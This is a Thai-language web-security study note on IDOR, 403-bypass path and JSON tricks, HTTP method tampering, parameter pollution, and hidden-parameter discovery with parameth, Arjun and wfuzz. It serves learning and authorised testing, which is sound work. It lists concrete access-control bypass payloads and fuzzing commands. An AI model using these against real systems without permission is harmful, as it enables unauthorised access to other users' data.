### <span style="color:rgb(255, 162, 31)">Insecure Direct Object Reference(IDOR)</span>
เป็นช่องโหว่ที่เกี่ยวกับสิทธิ์การใช้งาน ว่า user ใช้สิทธิ์ได้มากกว่าที่ควรจะเป็น
ยกตัวอย่าง
```plaintext
http://foo.bar/somepage?invoice=12345
```
invoice 12345 เป็น user A ซึ่งเป็นสิทธิ์ที่ชอบทำ แต่หาก user A อยากเข้าไป user B ซึ่งไม่ใช่สิทธิ์ของเขาก็อาจจะทำได้ถ้าไม่มีการตรวจสอบที่ดี 
```plaintext
http://foo.bar/somepage?invoice=12346
```
ลองเปลี่ยนจาก 12345 เป็น 12346 ถ้าเปลี่ยนได้ก็เรียบร้อยคับน้อง

การแก้ไข cookie ก็นับเป็น IDOR เหมือนกัน

CaseStudy md5 cookie
 [[CaseStudy md5 cookie]]
 
**Broken Access Control - Bypass 403**
 บางครั้ง /secret เข้าไม่ได้ แต่ /secret/ แม่งเข้าได้ไรงี้
 ยกตัวอย่างการ bypass
```
- site.com/secret –> HTTP 403 Forbidden
- site.com/SECRET –> HTTP 200 OK
- site.com/secret/ –> HTTP 200 OK
- site.com/secret/. –> HTTP 200 OK
- site.com//secret// –> HTTP 200 OK
- site.com/./secret/.. –> HTTP 200 OK
- site.com/;/secret –> HTTP 200 OK
- site.com/.;/secret –> HTTP 200 OK
- site.com//;//secret –> HTTP 200 OK
- site.com/secret.json –> HTTP 200 OK (ruby)
- site.com/v3/users_data/1234 --> 403 Forbidden
- site.com/v1/users_data/1234 --> 200 OK
- {“id”:111} --> 401 Unauthriozied
- {“id”:[111]} --> 200 OK
- {“id”:111} --> 401 Unauthriozied
- {“id”:{“id”:111}} --> 200 OK
- {"user_id":"<legit_id>","user_id":"<victims_id>"} (JSON Parameter Pollution)
- user_id=ATTACKER_ID&user_id=VICTIM_ID (Parameter Pollution)
```

**Parameter**
บางครั้งเราใช้ GET method ในการ /secret เข้าไม่ได้ แต่
เปลี่ยน POST method ในการเข้า /secret แม่งเข้าได้เป็นต้น
```
HTTP Method:
GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK
```


### <span style="color:rgb(255, 162, 31)">Finding hidden parameter</span>
คือ การค้นหา parameter ที่ซ่อนอยู่ใน url
ซึ่ง url นี้อาจจะรับข้อมูลแบบ API จึงต้องการระบุ parameter ในการ request จึงจะสามารถดึงข้อมูลได้
```
HTTP Method:
GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK
```
**Tool**
parameth
[https://github.com/maK-/parameth](https://github.com/maK-/parameth)
```plaintext
python parameth.py -u http://<TARGET>/<Path> -i g
```
ใช้ได้เฉพาะ python2 เท่านั่น ถ้าเครื่องใช้ phython3 แนะนำให้ไป  tool อื่น
arjun
[https://github.com/s0md3v/Arjun](https://github.com/s0md3v/Arjun)
```plaintext
arjun.py -u http://<TARGET>/<Path> --get
```
Wfuzz
```plaintext
wfuzz -u http://www.example.com/login.php?role=FUZZ -z file,/usr/share/wordlists/seclists/Passwords/Leaked-Databases/bible.txt
```
wordlist 
- [fuzzdb](https://code.google.com/p/fuzzdb/)
- [Seclists](https://github.com/danielmiessler/SecLists)

#### Mass Assignment
เดี๋ยวมาใส่เนื้อหาให้
